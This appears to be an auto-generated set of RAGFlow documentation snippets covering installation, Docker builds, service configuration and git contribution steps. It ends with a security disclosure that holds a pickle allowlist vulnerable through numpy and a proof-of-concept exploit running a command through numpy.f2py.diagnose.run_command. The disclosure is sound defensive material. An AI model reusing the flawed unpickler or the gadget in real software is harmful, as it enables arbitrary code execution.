bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\nuv run download_deps.py\ndocker build -f Dockerfile.deps -t infiniflow/ragflow_deps .\ndocker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Setting HuggingFace Endpoint for Model Download\nDESCRIPTION: This bash command sets an environment variable to use a mirror for downloading HuggingFace models, which can be helpful if there are issues with the default endpoint.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nexport HF_ENDPOINT=https://hf-mirror.com\n```\n\n----------------------------------------\n\nTITLE: Launching RAGFlow Service from Docker on MacOS\nDESCRIPTION: Commands to launch a RAGFlow service using Docker Compose on MacOS after building the Docker image.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/build_docker_image.mdx#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncd docker\n$ docker compose -f docker-compose-macos.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Checking RAGFlow Server Logs\nDESCRIPTION: Command to view the logs of the RAGFlow server container to confirm successful startup.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ docker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Cloning the RAGFlow Repository\nDESCRIPTION: Commands to clone the RAGFlow repository from GitHub and navigate to the project directory.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\n```\n\n----------------------------------------\n\nTITLE: Setting Up RAGFlow from Source\nDESCRIPTION: Steps to set up and run RAGFlow from source code, including installing dependencies, starting services, and running frontend and backend.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\npipx install uv\nexport UV_INDEX=https://mirrors.aliyun.com/pypi/simple\n```\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\nuv sync --python 3.10 --all-extras\n```\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose -f docker/docker-compose-base.yml up -d\n```\n\nLANGUAGE: bash\nCODE:\n```\nexport HF_ENDPOINT=https://hf-mirror.com\n```\n\nLANGUAGE: bash\nCODE:\n```\nsource .venv/bin/activate\nexport PYTHONPATH=$(pwd)\nbash docker/launch_backend_service.sh\n```\n\nLANGUAGE: bash\nCODE:\n```\ncd web\nnpm install\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Installing RAGFlow Python Dependencies (Slim Version)\nDESCRIPTION: Command to install the minimal set of Python dependencies required for RAGFlow using the UV package manager.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nuv sync --python 3.10 # install RAGFlow dependent python modules\n```\n\n----------------------------------------\n\nTITLE: Launching Third-Party Services with Docker Compose\nDESCRIPTION: Command to start the required base services (MinIO, Elasticsearch, Redis, and MySQL) using Docker Compose in detached mode.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose -f docker/docker-compose-base.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Commands to start the RAGFlow server using Docker Compose, with options for CPU or GPU acceleration.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cd ragflow/docker\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Adding Host Entries to /etc/hosts\nDESCRIPTION: Command to add host entries that map service names to localhost, enabling connection to containerized services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n127.0.0.1       es01 infinity mysql minio redis\n```\n\n----------------------------------------\n\nTITLE: Setting Up RAGFlow Development Environment\nDESCRIPTION: Steps to set up a development environment for RAGFlow, including installing dependencies, starting services, and running the frontend and backend.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\npipx install uv\nexport UV_INDEX=https://mirrors.aliyun.com/pypi/simple\n\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\nuv sync --python 3.10 --all-extras\n\ndocker compose -f docker/docker-compose-base.yml up -d\n\nexport HF_ENDPOINT=https://hf-mirror.com\n\nsource .venv/bin/activate\nexport PYTHONPATH=$(pwd)\nbash docker/launch_backend_service.sh\n\ncd web\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Activating Python Virtual Environment\nDESCRIPTION: Commands to activate the Python virtual environment and set up the PYTHONPATH environment variable.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nsource .venv/bin/activate\nexport PYTHONPATH=$(pwd)\n```\n\n----------------------------------------\n\nTITLE: Stopping RAGFlow Services\nDESCRIPTION: Command to stop RAGFlow frontend and backend services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\npkill -f \"ragflow_server.py|task_executor.py\"\n```\n\n----------------------------------------\n\nTITLE: Setting HuggingFace Mirror Endpoint\nDESCRIPTION: Optional command to configure the HuggingFace endpoint to use a mirror site when the original site is inaccessible.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nexport HF_ENDPOINT=https://hf-mirror.com\n```\n\n----------------------------------------\n\nTITLE: Checking and Setting vm.max_map_count in Bash\nDESCRIPTION: Commands to check and set the vm.max_map_count system parameter, which needs to be at least 262144 for RAGFlow to run properly.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Launching RAGFlow Backend Service (Task Executor)\nDESCRIPTION: Commands to run the backend service with jemalloc preloaded for improved memory management.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nJEMALLOC_PATH=$(pkg-config --variable=libdir jemalloc)/libjemalloc.so;\nLD_PRELOAD=$JEMALLOC_PATH python rag/svr/task_executor.py 1;\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (With Embedding Models)\nDESCRIPTION: Commands to clone the RAGFlow repository and build a Docker image with embedding models included, resulting in a larger image size.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: Launching RAGFlow API Server\nDESCRIPTION: Command to start the RAGFlow API server.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\npython api/ragflow_server.py;\n```\n\n----------------------------------------\n\nTITLE: Checking and Setting vm.max_map_count in Bash\nDESCRIPTION: Commands to check and set the vm.max_map_count value, which is required to be at least 262144 for RAGFlow to function properly.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Starting the RAGFlow Frontend Service\nDESCRIPTION: Command to start the frontend development server.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image Without Embedding Models\nDESCRIPTION: Commands to build a slim version of RAGFlow Docker image without embedding models\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ko.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Stopping the RAGFlow Frontend Service\nDESCRIPTION: Command to kill the npm process running the frontend service.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\npkill npm\n```\n\n----------------------------------------\n\nTITLE: Launching Dependent Services for RAGFlow Development\nDESCRIPTION: Command to start the required services (MinIO, Elasticsearch, Redis, and MySQL) using Docker Compose for RAGFlow development.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose -f docker/docker-compose-base.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Cloning RAGFlow Repository\nDESCRIPTION: Git command to clone the RAGFlow repository.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Formatting HTML Template with Variables\nDESCRIPTION: A basic HTML template example showing how to use variables (keys) in the template format. The template uses placeholders like {subtitle} and {content} which are replaced with actual values during processing.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/agent_component_reference/template.mdx#2025-04-10_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n<h2>{subtitle}</h2>\n<div>{content}</div>\n```\n\n----------------------------------------\n\nTITLE: Building Lightweight Docker Image for RAGFlow\nDESCRIPTION: Commands to clone the RAGFlow repository and build a lightweight Docker image (about 2GB) without embedding models. This image relies on external LLM and embedding services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Checking Ollama Port Status\nDESCRIPTION: Command to verify Ollama's port listening status using ss utility\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nsudo ss -tunlp | grep 11434\n```\n\n----------------------------------------\n\nTITLE: Checking and Setting vm.max_map_count in Linux\nDESCRIPTION: Commands to check and set the vm.max_map_count system parameter required for RAGFlow operation. Shows both temporary and permanent configuration methods.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Setting SYCL Command Lists for Intel GPU\nDESCRIPTION: Environment variable configuration for optimal performance on Intel Arc™ A-Series Graphics with Linux OS (Kernel 6.2)\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nexport SYCL_PI_LEVEL_ZERO_USE_IMMEDIATE_COMMANDLISTS=1\n```\n\n----------------------------------------\n\nTITLE: Navigating to Jina Server Directory\nDESCRIPTION: Command to change directory to rag/svr for Jina server deployment\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\ncd rag/svr\n```\n\n----------------------------------------\n\nTITLE: Launching Jina Server with Local Model\nDESCRIPTION: Command to run jina_server.py with a specified model from Hugging Face\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\npython jina_server.py  --model_name gpt2\n```\n\n----------------------------------------\n\nTITLE: Git Clone RAGFlow Repository Command\nDESCRIPTION: Command to clone the RAGFlow repository from GitHub, which is the first step in the upgrade process.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Checking RAGFlow Server Logs - Docker Command\nDESCRIPTION: Docker command to view the logs of the RAGFlow server container for troubleshooting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Setting RAGFlow Environment for nightly Image\nDESCRIPTION: Configuration for .env file to use the nightly Docker image, which includes embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nRAGFLOW_IMAGE=infiniflow/ragflow:nightly\n```\n\n----------------------------------------\n\nTITLE: Healthy Elasticsearch Container Status\nDESCRIPTION: Example output showing a healthy Elasticsearch container status. This is important for diagnosing Elasticsearch connection issues.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n91220e3285dd   docker.elastic.co/elasticsearch/elasticsearch:8.11.3   \"/bin/tini -- /usr/l…\"   11 hours ago   Up 11 hours (healthy)     9300/tcp, 0.0.0.0:9200->9200/tcp, :::9200->9200/tcp           ragflow-es-01\n```\n\n----------------------------------------\n\nTITLE: Checking Out a Specific RAGFlow Release Version\nDESCRIPTION: Git command to switch to a specific release version of RAGFlow, using v0.17.2 as an example.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngit checkout -f v0.17.2\n```\n\n----------------------------------------\n\nTITLE: Displaying RAGFlow Version Information - Log Output\nDESCRIPTION: Example of RAGFlow version information shown in system logs, displaying version number, commit count, and edition type.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n        ____   ___    ______ ______ __               \n       / __ \\ /   |  / ____// ____// /____  _      __\n      / /_/ // /| | / / __ / /_   / // __ \\| | /| / /\n     / _, _// ___ |/ /_/ // __/  / // /_/ /| |/ |/ / \n    /_/ |_|/_/  |_|\\____//_/    /_/ \\____/ |__/|__/                             \n\n2025-02-18 10:10:43,835 INFO     1445658 RAGFlow version: v0.15.0-50-g6daae7f2 full\n```\n\n----------------------------------------\n\nTITLE: Loading RAGFlow Docker Image in Offline Environment\nDESCRIPTION: Command to load a previously saved Docker image from a tar file in an offline environment.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ndocker load -i ragflow.v0.17.2.tar\n```\n\n----------------------------------------\n\nTITLE: Installing RAGFlow Python SDK with pip\nDESCRIPTION: Command to install the RAGFlow Python SDK version 0.13.0 using pip package manager.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/release_notes.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npip install ragflow-sdk==0.13.0\n```\n\n----------------------------------------\n\nTITLE: Checking and Setting vm.max_map_count on Linux\nDESCRIPTION: Commands to check and set the vm.max_map_count value on Linux systems, which is crucial for Elasticsearch or Infinity component in RAGFlow.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/quickstart.mdx#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Committing Changes with Descriptive Message in Git\nDESCRIPTION: Command to commit your changes with a descriptive message. The commit message should provide sufficient information about the changes made.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/CONTRIBUTING.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit commit -m 'Provide sufficient info in your commit message'\n```\n\n----------------------------------------\n\nTITLE: Configuring RAGFlow Services in YAML\nDESCRIPTION: This snippet outlines the structure of the service_conf.yaml file used to configure RAGFlow's API server, task executor, and various connected services like MySQL, MinIO, and OAuth providers. It includes settings for database connections, storage services, and optional LLM configurations.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docker/README.md#2025-04-10_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nragflow:\n  host: 0.0.0.0\n  port: 9380\n\nmysql:\n  name: rag_flow\n  user: your_username\n  password: your_password\n  port: 3306\n  max_connections: 100\n  stale_timeout: 300\n\nminio:\n  user: your_username\n  password: your_password\n  host: minio:9000\n\noss:\n  access_key: your_access_key\n  secret_key: your_secret_key\n  endpoint_url: your_endpoint_url\n  region: your_region\n  bucket: your_bucket_name\n  prefix_path: optional_prefix\n\ns3:\n  access_key: your_access_key\n  secret_key: your_secret_key\n  endpoint_url: your_endpoint_url\n  bucket: your_bucket_name\n  region: your_region\n  signature_version: optional_version\n  addressing_style: optional_style\n  prefix_path: optional_prefix\n\n# oauth:\n#   github:\n#     client_id: your_client_id\n#     secret_key: your_secret_key\n\n# user_default_llm:\n#   factory: \"OpenAI\"\n#   api_key: your_api_key\n```\n\n----------------------------------------\n\nTITLE: Creating a Local Branch in Git\nDESCRIPTION: Command to create and checkout a new local branch for development. This allows you to work on your changes separately from the main branch.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/CONTRIBUTING.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit checkout -b my-branch\n```\n\n----------------------------------------\n\nTITLE: Configuring ChatGPT-on-WeChat for WeChat in JSON\nDESCRIPTION: Example configuration for the ChatGPT-on-WeChat root config.json file, specifically for the WeChat channel. It includes settings for the WeChat app ID, secret, token, and port.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/intergrations/chatgpt-on-wechat/plugins/README.md#2025-04-10_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"channel_type\": \"wechatmp\",\n  \"wechatmp_app_id\": \"YOUR_APP_ID\",\n  \"wechatmp_app_secret\": \"YOUR_APP_SECRET\",\n  \"wechatmp_token\": \"YOUR_TOKEN\",\n  \"wechatmp_port\": 80,\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning the RAGFlow Repository in Git\nDESCRIPTION: Command to clone the forked RAGFlow repository to your local machine. This is the first step in the contribution workflow after forking the repository.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/CONTRIBUTING.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit clone git@github.com:<yourname>/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Pushing Local Branch to GitHub in Git\nDESCRIPTION: Command to push your local branch to your forked repository on GitHub. This is needed before creating a pull request for your changes.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/CONTRIBUTING.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit push origin my-branch.\n```\n\n----------------------------------------\n\nTITLE: Publishing Python Package to PyPI using Twine\nDESCRIPTION: Shell commands to build the Python package using uv, install twine, configure PyPI credentials, and upload the wheel distribution to PyPI. Requires a PyPI API token for authentication.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/sdk/python/README.md#2025-04-10_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nuv build\nuv pip install twine\nexport TWINE_USERNAME=\"__token__\"\nexport TWINE_PASSWORD=$YOUR_PYPI_API_TOKEN\ntwine upload dist/*.whl\n```\n\n----------------------------------------\n\nTITLE: Implementing Restricted Unpickler in Python\nDESCRIPTION: This code snippet defines a RestrictedUnpickler class and a restricted_loads function to limit unpickling to safe modules. However, it contains a vulnerability allowing code execution through the numpy module.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/SECURITY.md#2025-04-10_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport builtins\nimport io\nimport pickle\n\nsafe_module = {\n    'numpy',\n    'rag_flow'\n}\n\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        import importlib\n        if module.split('.')[0] in safe_module:\n            _module = importlib.import_module(module)\n            return getattr(_module, name)\n        # Forbid everything else.\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %\n                                     (module, name))\n\n\ndef restricted_loads(src):\n    \"\"\"Helper function analogous to pickle.loads().\"\"\"\n    return RestrictedUnpickler(io.BytesIO(src)).load()\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker Environment Variables for RAGFlow\nDESCRIPTION: This snippet shows the structure of the .env file used to set important environment variables for Docker containers running RAGFlow and its dependencies. It includes settings for Elasticsearch, Kibana, MySQL, MinIO, Redis, and RAGFlow itself.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docker/README.md#2025-04-10_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nSTACK_VERSION=8.11.3\nES_PORT=1200\nELASTIC_PASSWORD=your_password\n\nKIBANA_PORT=6601\nKIBANA_USER=rag_flow\nKIBANA_PASSWORD=infini_rag_flow\n\nMEM_LIMIT=8073741824\n\nMYSQL_PASSWORD=your_password\nMYSQL_PORT=5455\n\nMINIO_CONSOLE_PORT=9001\nMINIO_PORT=9000\nMINIO_USER=your_username\nMINIO_PASSWORD=your_password\n\nREDIS_PORT=6379\nREDIS_PASSWORD=your_password\n\nSVR_HTTP_PORT=9380\nRAGFLOW-IMAGE=infiniflow/ragflow:v0.17.2-slim\n\nTIMEZONE='Asia/Shanghai'\n\n# HF_ENDPOINT=your_mirror_site\n# MACOS=true\n# MAX_CONTENT_LENGTH=134217728\n```\n\n----------------------------------------\n\nTITLE: Error Response from document download API\nDESCRIPTION: JSON error response structure showing a TypeError where an unexpected 'tenant_id' parameter was passed to the download_document() function. The response includes null data, error code 100, and the error message.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/sdk/python/test/test_sdk_api/test_data/ragflow.txt#2025-04-10_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\"data\":null,\"code\":100,\"message\":\"TypeError(\\\"download_document() got an unexpected keyword argument 'tenant_id'\\\")\"}\n```\n\n----------------------------------------\n\nTITLE: Chrome Extension Directory Structure\nDESCRIPTION: Detailed file structure layout for a Chrome extension project, showing the organization of manifest files, scripts, styles, and assets. Includes main components like popup interface, background scripts, and content scripts along with supporting resources.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/intergrations/extension_chrome/README.md#2025-04-10_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nchrome-extension/\n│\n├── manifest.json         # Main configuration file for the extension\n├── popup.html          # Main user interface of the extension\n├── popup.js            # Script for the main interface\n├── background.js       # Background script for the extension\n├── content.js          # Script to interact with web pages\n├── styles/\n│   └── popup.css       # CSS file for the popup\n├── icons/\n│   ├── icon16.png      # 16x16 pixel icon\n│   ├── icon48.png      # 48x48 pixel icon\n│   └── icon128.png     # 128x128 pixel icon\n├── assets/\n│   └── ...             # Directory for other assets (images, fonts, etc.)\n├── scripts/\n│   ├── utils.js        # File containing utility functions\n│   └── api.js          # File containing API call logic\n└── README.md           # Instructions for using and installing the extension\n```\n\n----------------------------------------\n\nTITLE: Exploiting Vulnerability in Restricted Unpickler with Python\nDESCRIPTION: This proof of concept demonstrates how to exploit the vulnerability in the restricted_loads function by using numpy.f2py.diagnose.run_command to execute arbitrary commands.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/SECURITY.md#2025-04-10_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport pickle\nfrom ragflow_patch import restricted_loads\nclass Exploit:\n     def __reduce__(self):\n         import numpy.f2py.diagnose\n         return numpy.f2py.diagnose.run_command, ('whoami', )\n\nPayload=pickle.dumps(Exploit())\nrestricted_loads(Payload)\n```"
  }
]